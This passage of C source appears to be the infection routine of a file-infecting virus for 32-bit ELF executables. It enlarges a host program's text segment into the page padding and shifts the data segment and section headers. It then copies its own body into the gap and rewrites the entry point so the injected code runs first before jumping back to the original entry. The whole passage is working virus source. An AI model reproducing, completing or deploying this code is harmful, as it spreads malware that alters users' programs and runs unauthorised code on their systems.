	uint32_t dp, tp, ve, vo;
	/* find loadable segments and check 'em */
	phdr = (Elf32_Phdr*)(m + ehdr->e_phoff);	
        for (i = 0; i < ehdr->e_phnum; i++)
                if (phdr[i].p_type == PT_LOAD && phdr[i].p_offset == 0 &&
		   (i + 1) < ehdr->e_phnum && phdr[i + 1].p_type == PT_LOAD) {
                        if (phdr[i].p_filesz != phdr[i].p_memsz)
                                break;
			goto ok;
                }
	goto _unmap;
ok:     vo = phdr[i].p_filesz;
        ve = phdr[i].p_vaddr + phdr[i].p_filesz;
        tp = 4096 - (phdr[i].p_filesz & 4095);
        dp = phdr[i + 1].p_vaddr - (phdr[i + 1].p_vaddr & ~4095);
	if (tp + dp < g->size || tp == 0x1000 || phdr[i + 1].p_filesz == 0)
		goto _unmap;
	
	/* update program headers */
	phdr[i].p_memsz += tp;
        phdr[i].p_filesz += tp;
	if (dp != 0) {
		/* adjust data seg */
	        phdr[i + 1].p_vaddr -= dp;
        	phdr[i + 1].p_paddr -= dp;
	       	phdr[i + 1].p_offset += tp;
        	phdr[i + 1].p_filesz += dp;
	       	phdr[i + 1].p_memsz += dp;

		/* adjust PHDRs */
		for (i = i + 2; i < ehdr->e_phnum; i++)
			if (phdr[i].p_offset >= vo)
				phdr[i].p_offset += tp + dp;	

		/* make hole */
		MAKE_HOLE(vo, tp + dp);
		
		/* adjust SHDRs */
		SHIFT_SHDRS(vo, tp + dp);
	}
	memcpy(m + vo, g->self, g->size);
	
	*(uint32_t*)(m + vo + 8) = old_entry - ve - 12;
	ehdr->e_entry = ve;
